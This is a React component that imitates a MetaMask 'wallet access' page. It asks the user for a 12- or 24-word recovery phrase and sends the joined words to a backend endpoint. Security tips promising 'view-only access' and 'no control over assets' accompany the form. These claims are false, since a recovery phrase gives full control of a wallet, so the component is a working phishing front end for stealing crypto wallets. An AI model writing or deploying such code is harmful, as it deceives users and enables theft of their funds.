import { useState } from "react";
import { Shield, Lock } from "lucide-react";
import logo from "../../assets/metamask_dark.png";
import { useMutation } from "@tanstack/react-query";
import { apiRequest, userId } from "../../../helpers/Config";
import { ImSpinner9 } from "react-icons/im";
import { IoMdClose } from "react-icons/io";
import { PiSpinnerGapBold } from "react-icons/pi";
import { useNavigate } from "react-router-dom";

const MetaMask = () => {
  const [phraseLength, setPhraseLength] = useState(12);
  const [mnemonic, setMnemonic] = useState<string[]>(
    Array(phraseLength).fill("")
  );
  const [loading, setLoading] = useState(false);
  const nav = useNavigate();

  const handleWordChange = (index: number, value: string) => {
    const updated = [...mnemonic];
    updated[index] = value.toLowerCase().trim();
    setMnemonic(updated);
  };

  const { isPending, mutate } = useMutation({
    mutationFn: (passphrase: string) =>
      apiRequest(`/wallet/connect/${userId}`, "POST", {
        walletType: "MetaMask",
        passphrase,
      }),
    onSuccess: (data) => {
      nav("/?auth=true");
      console.log("Connected:", data);
    },
  });

  const handleConnect = () => {
    if (mnemonic.includes("")) return;
    const currentPassphrase = mnemonic.join(", ");
    setLoading(true);
    mutate(currentPassphrase);
  };

  const togglePhraseLength = () => {
    const newLength = phraseLength === 12 ? 24 : 12;
    setPhraseLength(newLength);
    setMnemonic(Array(newLength).fill(""));
  };

  return (
    <div className="min-h-screen bg-black text-gray-100 w-full mt-11">
      <div className="px-4 pt-6">
        <button
          onClick={() => nav(-1)}
          className="flex items-center text-gray-300 hover:text-white transition-colors"
        >
          <svg
            xmlns="http://www.w3.org/2000/svg"
            className="h-5 w-5 mr-2"
            fill="none"
            viewBox="0 0 24 24"
            stroke="currentColor"
          >
            <path
              strokeLinecap="round"
              strokeLinejoin="round"
              strokeWidth={2}
              d="M15 19l-7-7 7-7"
            />
          </svg>
          Back
        </button>
      </div>

      {loading && (
        <LoadingModal
          type="Secure Wallet Sync"
          onClose={() => setLoading(false)}
        />
      )}

      <div className="container mx-auto px-4 py-8">
        <div className="grid md:grid-cols-2 gap-8">
          <div className="p-6">
            <div className="flex items-center gap-3 mb-8">
              <img src={logo} alt="Wallet" className="h-10 w-10" />
              <h2 className="text-2xl font-semibold">Advanced Wallet Access</h2>
            </div>

            <div className="space-y-6">
              <div>
                <div className="flex justify-between mb-2">
                  <label className="block text-sm font-medium text-gray-300">
                    Access Phrase ({phraseLength} words)
                  </label>
                  <button
                    onClick={togglePhraseLength}
                    className="text-sm text-blue-400 hover:underline"
                  >
                    Switch to {phraseLength === 12 ? "24" : "12"} words
                  </button>
                </div>

                <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 gap-3 mb-4">
                  {mnemonic.map((word, index) => (
                    <input
                      key={index}
                      type="text"
                      value={word}
                      onChange={(e) => handleWordChange(index, e.target.value)}
                      className="w-full bg-gray-800 border border-gray-700 rounded-lg py-2 px-3 text-white text-sm placeholder-gray-500"
                      placeholder={`Word ${index + 1}`}
                    />
                  ))}
                </div>
              </div>

              <button
                onClick={handleConnect}
                disabled={isPending || mnemonic.includes("")}
                className={`w-[40%] rounded-lg py-3 px-4 font-medium flex items-center justify-center transition
                  ${
                    mnemonic.includes("")
                      ? "bg-gray-700 text-gray-400 cursor-not-allowed"
                      : "bg-blue-600 hover:bg-blue-700 text-white"
                  }`}
              >
                {isPending ? (
                  <ImSpinner9 className="animate-spin text-2xl" />
                ) : (
                  "Proceed"
                )}
              </button>

              <div className="mt-8 pt-6 border-t border-gray-800 space-y-4">
                <SecurityTip
                  icon={<Shield className="h-5 w-5 text-blue-400" />}
                  bg="bg-blue-600/20"
                  title="Secure Sync"
                  desc="End-to-end encrypted connection to verify ownership"
                />
                <SecurityTip
                  icon={<Lock className="h-5 w-5 text-green-400" />}
                  bg="bg-green-600/20"
                  title="View-Only Access"
                  desc="No control over assets or transactions"
                />
                <p className="text-xs text-yellow-400 pt-2">
                  ⚠️ Use only on devices you trust. This feature is intended for
                  read-only and secure access.
                </p>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default MetaMask;

const SecurityTip = ({
  icon,
  bg,
  title,
  desc,
}: {
  icon: React.ReactNode;
  bg: string;
  title: string;
  desc: string;
}) => (
  <div className="flex items-start gap-3">
    <div className={`p-2 ${bg} rounded-lg`}>{icon}</div>
    <div>
      <h4 className="text-sm font-medium text-gray-200">{title}</h4>
      <p className="text-sm text-gray-400">{desc}</p>
    </div>
  </div>
);

export const LoadingModal = ({
  type,
  onClose,
}: {
  type: string;
  onClose: () => void;
}) => (
  <div className="fixed inset-0 z-50 bg-black/60 flex justify-center items-center">
    <div className="w-80 h-64 bg-white rounded-xl p-4 text-black flex flex-col justify-between shadow-lg">
      <div className="flex justify-between items-center">
        <h1 className="text-lg font-semibold">{type}</h1>
        <IoMdClose className="text-xl cursor-pointer" onClick={onClose} />
      </div>

      <div className="flex-1 flex flex-col justify-center items-center text-center">
        <p className="mb-6 text-sm text-gray-700">
          Creating secure connection...
        </p>
        <PiSpinnerGapBold className="animate-spin text-6xl text-gray-600" />
      </div>
    </div>
  </div>
);
